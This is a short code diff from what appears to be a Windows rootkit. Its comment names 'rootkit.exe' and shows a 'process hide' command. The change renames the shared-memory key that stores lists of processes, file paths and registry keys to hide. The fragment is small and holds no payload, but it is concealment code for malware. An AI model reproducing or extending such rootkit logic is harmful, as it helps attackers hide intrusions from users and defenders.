@@ -44,7 +44,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     registryKeysToHide.push_back(str3);
 
 
-    serialitzator.serializeVectorWCharTPointer(processesToHide, L"processAgentMapped");
+    serialitzator.serializeVectorWCharTPointer(processesToHide, L"agentMapped");
     serialitzator.serializeVectorWString(pathsToHide, L"pathMapped");
     serialitzator.serializeVectorWString(registryKeysToHide, L"registryMapped");
 
@@ -55,7 +55,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     // - rootkit.exe process hide processname.exe
     if (argc == 4 && wcscmp(argv[1], L"process") == 0 && wcscmp(argv[2], L"hide") == 0) {
         wchar_t* processName = argv[3];
-        vector<wchar_t*> deserializedStrings = serialitzator.deserializeWCharTPointerVector(L"processAgentMapped");
+        vector<wchar_t*> deserializedStrings = serialitzator.deserializeWCharTPointerVector(L"agentMapped");
         wstring processNameW(processName);
         deserializedStrings.push_back(&processNameW[0]);
         serialitzator.serializeVectorWCharTPointer(deserializedStrings, L"agentMapped");
